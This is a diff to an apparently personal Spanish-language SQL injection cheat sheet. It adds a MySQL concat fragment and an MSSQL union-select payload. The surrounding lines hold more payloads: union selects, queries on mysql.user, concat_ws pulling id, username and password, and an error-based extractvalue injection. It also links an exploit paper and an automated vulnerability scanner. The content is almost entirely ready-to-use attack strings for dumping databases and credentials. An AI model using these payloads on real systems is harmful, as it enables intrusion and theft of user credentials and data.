@@ -224,6 +224,7 @@ Ponemos ' o ; y si es vulnerable, a probar
 ' union select * from tabla_a_ver;# Para ver contenido
 SELECT * FROM mysql.user
 SELECT User from mysql.user
+	concat(mysql,0x2e,user)
 
 concat_ws(':',id, username, password)
 
@@ -251,7 +252,10 @@ SQL Injection en Where (UPDATE o DELETE, muestra la salida en el error que apare
 	+limit+X,1) si devuelve más de una columna y da error
 	view=-35" and extractvalue(0x0a,concat(0x0a,(select database())))--
 	https://www.exploit-db.com/docs/33253
-	
+
+MSSQL
+	SELECT TOP 10 * from information_schema.tables union select 1,2,3,4
+
 ESCÁNER AUTOMÁTICO
 https://github.com/v3n0m-Scanner/V3n0M-Scanner
 
